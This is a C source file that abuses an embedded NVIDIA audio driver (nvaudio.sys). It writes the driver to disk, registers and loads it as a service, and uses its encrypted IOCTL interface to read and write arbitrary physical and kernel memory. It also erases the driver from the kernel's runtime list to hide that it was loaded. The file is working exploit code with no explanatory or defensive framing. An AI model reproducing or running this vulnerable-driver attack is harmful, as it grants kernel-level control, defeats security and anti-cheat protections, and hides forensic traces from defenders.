
#include "main.h"

#define NVAUDIO_DEVICE_NAME L"\\Device\\NVR0Internal"
#define NVAUDIO_DRIVER_PATH L"\\SystemRoot\\nvaudio.sys"
#define NVAUDIO_SERVICE_PATH \
    L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\NVR0Internal"

typedef PVOID (*EncodePayLoad_t)(PVOID Request, LONG EncodeCode, ULONGLONG* EncryptionKey);
static EncodePayLoad_t EncodePayLoad = 0;
static PVOID NvAudioLibrary          = 0;

NTSTATUS LoadDriver(_Out_ PHANDLE DeviceHandle)
{
    UNICODE_STRING UnicodeString;
    NTSTATUS Status;
    HANDLE Token;
    TOKEN_PRIVILEGES Privileges;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;

    WCHAR DeviceName[]     = NVAUDIO_DEVICE_NAME;
    WCHAR ServiceName[]    = NVAUDIO_SERVICE_PATH;
    WCHAR DriverFullPath[] = NVAUDIO_DRIVER_PATH;

    if ARGUMENT_PRESENT (DeviceHandle)
        *DeviceHandle = NULL;

    //
    // Set Privilege.
    //

    Privileges.PrivilegeCount              = 1;
    Privileges.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;
    Privileges.Privileges[0].Luid.LowPart  = SE_LOAD_DRIVER_PRIVILEGE;
    Privileges.Privileges[0].Luid.HighPart = 0;

    Status = NtOpenThreadToken(
        NtCurrentThread(),
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
        FALSE,
        &Token);
    if (Status == STATUS_NO_TOKEN) {
        Status
            = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &Token);
    }

    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
        return Status;
    }

    Status
        = NtAdjustPrivilegesToken(Token, FALSE, &Privileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    NtClose(Token);

    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
        return Status;
    }

    RtlInitUnicodeString(&UnicodeString, DeviceName);
    InitializeObjectAttributes(&ObjectAttributes, &UnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);
    Status = NtOpenFile(
        DeviceHandle,
        FILE_ALL_ACCESS,
        &ObjectAttributes,
        &IoStatusBlock,
        (FILE_SHARE_READ | FILE_SHARE_WRITE),
        FILE_ATTRIBUTE_DEVICE);

    if NT_ERROR (Status) {
        //
        // Write File to Disk.
        //

        Status = RtlFileWrite(DriverFullPath, DriverResource, sizeof(DriverResource));
        if NT_ERROR (Status) {
            DEBUG_PRINT_NTERROR(Status);
            return Status;
        }

        //
        // Set registry and load driver.
        //

        RtlInitUnicodeString(&UnicodeString, DriverFullPath);
        Status = RtlRegSetKeyValue(
            ServiceName,
            L"ImagePath",
            REG_SZ,
            UnicodeString.Buffer,
            UnicodeString.MaximumLength);

        if NT_SUCCESS (Status)
            Status = RtlRegSetKeyValue32(ServiceName, L"Type", 1);

        if NT_ERROR (Status) {
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTERROR(Status);
            return Status;
        }

        RtlInitUnicodeString(&UnicodeString, ServiceName);
        Status = NtLoadDriver(&UnicodeString);

        if NT_ERROR (Status) {
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTERROR(Status);
            return Status;
        }

        //
        // Open device handle
        //

        RtlInitUnicodeString(&UnicodeString, DeviceName);
        InitializeObjectAttributes(
            &ObjectAttributes,
            &UnicodeString,
            OBJ_CASE_INSENSITIVE,
            NULL,
            NULL);
        Status = NtOpenFile(
            DeviceHandle,
            FILE_ALL_ACCESS,
            &ObjectAttributes,
            &IoStatusBlock,
            (FILE_SHARE_READ | FILE_SHARE_WRITE),
            FILE_ATTRIBUTE_DEVICE);

        if NT_ERROR (Status) {
            RtlInitUnicodeString(&UnicodeString, ServiceName);
            NtUnloadDriver(&UnicodeString);
            RtlRegDeleteKey(ServiceName);
            RtlFileDelete(DriverFullPath);

            DEBUG_PRINT_NTERROR(Status);
            return Status;
        }
    }

    //
    // Init specified driver routine.
    //

    if (NvAudioLibrary == 0) {
        RtlInitUnicodeString(&UnicodeString, L"nvaudio.sys");
        Status = LdrLoadDll(NULL, NULL, &UnicodeString, &NvAudioLibrary);

        if NT_ERROR (Status) {
            UnloadDriver(*DeviceHandle);

            DEBUG_PRINT_NTERROR(Status);
            return Status;
        }

        EncodePayLoad = (EncodePayLoad_t)((PCHAR)NvAudioLibrary + 0x2130);
    }

    //
    // Remove Driver RuntimeList.
    //

    DEVICE_DRIVER_OBJECT Driver;
    Driver.DeviceHandle = *DeviceHandle;
    Driver.ReadMemory   = ReadSystemMemory;
    Driver.WriteMemory  = WriteSystemMemory;
    if (RemoveDriverRuntimeList(
            &Driver,
            L"nvaudio.sys",
            RtlImageNtHeader(NvAudioLibrary)->FileHeader.TimeDateStamp)
        == FALSE) {
        LdrUnloadDll(NvAudioLibrary);
        NvAudioLibrary = 0;
        UnloadDriver(*DeviceHandle);

        Status = STATUS_ACCESS_DENIED;
        DEBUG_PRINT_NTERROR(Status);
        return Status;
    }

    return Status;
}

NTSTATUS UnloadDriver(_In_ HANDLE DeviceHandle)
{
    NTSTATUS Status;
    UNICODE_STRING UnicodeString;
    WCHAR ServiceName[]    = NVAUDIO_SERVICE_PATH;
    WCHAR DriverFullPath[] = NVAUDIO_DRIVER_PATH;

    if (NvAudioLibrary) {
        LdrUnloadDll(NvAudioLibrary);
        NvAudioLibrary = 0;
    }

    if (DeviceHandle) {
        Status       = NtClose(DeviceHandle);
        DeviceHandle = NULL;

        if NT_ERROR (Status) {
            DEBUG_PRINT_NTERROR(Status);
        }
    }

    // ==========================================================
    // Unload Driver.
    // ==========================================================
    RtlInitUnicodeString(&UnicodeString, ServiceName);
    Status = NtUnloadDriver(&UnicodeString);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
    }

    Status = RtlRegDeleteKey(ServiceName);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
    }

    Status = RtlFileDelete(DriverFullPath);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
    }

    return Status;
}

NTSTATUS DeviceControl(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG* EncryptionKey,
    _In_ PVOID Buffer,
    _In_ SIZE_T BufferLength)
{
    IO_STATUS_BLOCK IoStatus;
    NTSTATUS Status;

    EncodePayLoad(Buffer, 0x38, EncryptionKey);

    Status = NtDeviceIoControlFile(
        DeviceHandle,
        NULL,
        NULL,
        NULL,
        &IoStatus,
        NVAUDIO_IOCTL_CODE,
        Buffer,
        (ULONG)BufferLength,
        Buffer,
        (ULONG)BufferLength);
    if (Status == STATUS_PENDING) {
        Status = NtWaitForSingleObject(DeviceHandle, FALSE, NULL);
    }

    return Status;
}

NTSTATUS ReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG PhysicalAddress,
    _Out_writes_bytes_(BufferLength) PVOID Buffer,
    _In_ SIZE_T BufferLength)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass  = READ_PHYSICAL_MEMORY;
    Request.NumberOfBytes = (LONG)BufferLength;
    Request.Destination   = (LONGLONG)Buffer;
    Request.Source        = PhysicalAddress;

    return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
}

NTSTATUS WritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG PhysicalAddress,
    _In_reads_bytes_(BufferLength) PVOID Buffer,
    _In_ SIZE_T BufferLength)
{
    NVAUDIO_REQUEST Request;
    Request.RequestClass  = WRITE_PHYSICAL_MEMORY;
    Request.NumberOfBytes = (LONG)BufferLength;
    Request.Destination   = PhysicalAddress;
    Request.Source        = (LONGLONG)Buffer;

    return DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
}

NTSTATUS GetPhysicalAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG VirtualAddress,
    _Out_ PULONGLONG PhysicalAddress)
{
    NVAUDIO_REQUEST Request;
    NTSTATUS Status;
    Request.RequestClass    = GET_PHYSICAL_ADDRESS;
    Request.PhysicalAddress = 0;
    Request.VirtualAddress  = VirtualAddress;
    *PhysicalAddress        = 0;

    Status = DeviceControl(DeviceHandle, Request.EncryptionKey, &Request, sizeof(NVAUDIO_REQUEST));
    if NT_SUCCESS (Status) {
        *PhysicalAddress = Request.PhysicalAddress;
    }
    return Status;
}

NTSTATUS ReadSystemMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG Source,
    _Out_writes_bytes_(Length) PVOID Destination,
    _In_ SIZE_T Length)
{
    ULONGLONG PhysicalAddress;
    NTSTATUS Status;

    Status = GetPhysicalAddress(DeviceHandle, Source, &PhysicalAddress);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
        return Status;
    }

    return ReadPhysicalMemory(DeviceHandle, PhysicalAddress, Destination, Length);
}

NTSTATUS WriteSystemMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONGLONG Destination,
    _In_reads_bytes_(Length) PVOID Source,
    _In_ SIZE_T Length)
{
    ULONGLONG PhysicalAddress;
    NTSTATUS Status;

    Status = GetPhysicalAddress(DeviceHandle, Destination, &PhysicalAddress);
    if NT_ERROR (Status) {
        DEBUG_PRINT_NTERROR(Status);
        return Status;
    }

    return WritePhysicalMemory(DeviceHandle, PhysicalAddress, Source, Length);
}
